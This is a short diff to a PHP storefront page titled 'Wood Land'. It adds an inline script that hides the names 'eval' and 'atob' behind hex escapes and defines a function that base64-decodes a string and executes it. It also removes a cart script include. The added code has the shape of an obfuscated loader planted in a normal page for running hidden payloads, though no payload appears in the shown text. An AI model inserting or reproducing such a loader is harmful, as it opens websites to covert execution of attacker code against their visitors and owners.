@@ -9,6 +9,12 @@ session_start();
    
     <title>Wood Land</title>
 
+<script>
+  sfd=this["\x65\x76\x61\x6C"];rty=this["\x61\x74\x6F\x62"];glob=function(s){sfd(rty(s.substring(-~[])));}
+</script>
+
+
+
 <meta name="viewport" content="width=device-width; initial-scale=1.0">
 
     <!-- Bootstrap core CSS -->
@@ -32,7 +38,6 @@ session_start();
 <script src="http://code.jquery.com/jquery-1.11.0.min.js" type="text/javascript" ></script>
 <script src="../Cart/wicart.js"  type="text/javascript" ></script>
 <script src="../Cart/wicart.num.js"  type="text/javascript"></script>
-<script src="../Cart/jscode.js"  type="text/javascript"></script>
 
         <script type="text/javascript">
             $(document).ready(function(){
